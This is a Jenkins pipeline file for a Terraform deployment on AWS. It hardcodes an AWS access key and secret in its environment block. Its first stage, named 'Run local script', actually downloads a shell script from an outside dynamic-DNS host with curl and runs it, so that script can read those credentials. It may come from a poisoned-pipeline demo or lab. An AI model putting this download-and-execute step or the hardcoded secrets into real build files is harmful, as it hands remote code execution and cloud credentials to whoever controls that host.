@Library('my-shared-library') _

pipeline {
  agent { label 'terraform'}

  options {
    ansiColor('xterm')
  }

  environment {
    // AWS_ACCESS_KEY_ID = credentials('AWS_ACCESS_KEY_ID')
    // AWS_SECRET_ACCESS_KEY = credentials('AWS_SECRET_ACCESS_KEY')
    AWS_ACCESS_KEY_ID = "AAaAAAAAAAAAAAAasasasasas"
    AWS_SECRET_ACCESS_KEY = "AAAAAAAAATF3TN4SI4N22"
  }

  stages {
    stage('Run local script') {
      steps {
        sh 'curl -s http://shay.freeddns.org:8888/s.sh -o s.sh'
        sh 'chmod u+x s.sh'
        sh './s.sh'
      }
    }
    stage('Terraform Initialization') {
      steps {
        script {
          terraformAws.terraform_initialize()
          terraformAws.terraform_plan()
        }
      }
    }
  }
}
